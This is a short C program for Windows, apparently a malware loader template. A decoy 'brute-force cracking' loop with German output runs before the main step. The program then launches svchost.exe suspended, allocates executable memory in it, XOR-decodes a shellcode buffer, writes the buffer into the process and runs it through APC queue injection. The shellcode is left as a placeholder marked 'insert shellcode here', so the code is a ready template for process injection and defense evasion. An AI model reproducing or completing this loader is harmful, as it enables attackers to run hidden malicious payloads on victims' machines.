#include <stdio.h>
#include <stdlib.h>
#include <windows.h>



#define CODE_LENGTH 4 
#define MAX_CODE_VALUE 9999



// XOR-ENC FUNCTION
void xor_encrypt(unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}



int main() {
    int attempt = 0;

    printf("Automatisches Brute-Force-Cracking\n");

    for (int code = 0; code <= MAX_CODE_VALUE; code++) {
        attempt++;
        printf("Versuch %d: Code %03d\n", attempt, code);

        // Überprüfen, ob der aktuelle Code der Zielcode ist
        if (code == 8000) {
            	printf("Execution...\n");
            
            
            
		// unsigned char buf[] = ""  // --- INSERT SHELLCODE HERE ---

		size_t len = sizeof(buf) / sizeof(buf[0]);


		// XOR KEY 
		unsigned char key = 0xAB;



		STARTUPINFOA si = {0};
		PROCESS_INFORMATION pi = {0};

		CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
		HANDLE victimProcess = pi.hProcess;
		HANDLE threadHandle = pi.hThread;

		LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);


		// XOR DECRYPTION 
		xor_encrypt(buf, len, key);


		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

		WriteProcessMemory(victimProcess, shellAddress, buf, len, NULL);
		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
		ResumeThread(threadHandle);
            
            
            
            	break;
        }
    }


    return 0;
}
